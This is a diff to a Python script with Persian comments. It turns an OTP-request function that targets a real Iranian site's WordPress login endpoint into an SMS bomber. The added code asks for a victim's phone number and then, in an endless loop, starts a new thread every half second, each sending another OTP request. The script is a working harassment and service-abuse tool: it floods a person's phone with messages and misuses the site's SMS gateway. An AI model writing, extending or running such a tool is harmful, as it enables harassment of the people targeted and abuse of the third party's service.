@@ -6,13 +6,11 @@ from threading import Thread
 g = '\033[32;1m'
 r = '\033[31;1m'
 y = '\033[33;1m'
+p = '\033[35;1m'
 a = '\033[0m'
 
+# تابع ارسال OTP از ilozi
 def ilozi(phone):
-    """
-    ارسال کد OTP از سایت ilozi
-    شماره باید بدون صفر و بدون +98 باشد: مثال 9173644430
-    """
     url = "https://ilozi.com/wp-admin/admin-ajax.php"
     payload = {
         "login_digt_countrycode": "+98",
@@ -50,3 +48,27 @@ def ilozi(phone):
     except Exception as e:
         print(f"{r}[!] Exception: {e}{a}")
         return False
+
+# اجرای همزمان
+def bomber(phone, delay=0.5):
+    try:
+        while True:
+            Thread(target=ilozi, args=(phone,)).start()
+            sleep(delay)
+    except KeyboardInterrupt:
+        print(f"{g}[+] Stopped!{a}")
+
+# اعتبارسنجی شماره
+def is_phone(phone):
+    import re
+    if re.match(r"^\d{10}$", phone):
+        return phone
+    return False
+
+if __name__ == "__main__":
+    phone = input("Enter phone (e.g. 9173644430): ")
+    phone = is_phone(phone)
+    if not phone:
+        print("Invalid phone!")
+    else:
+        bomber(phone)
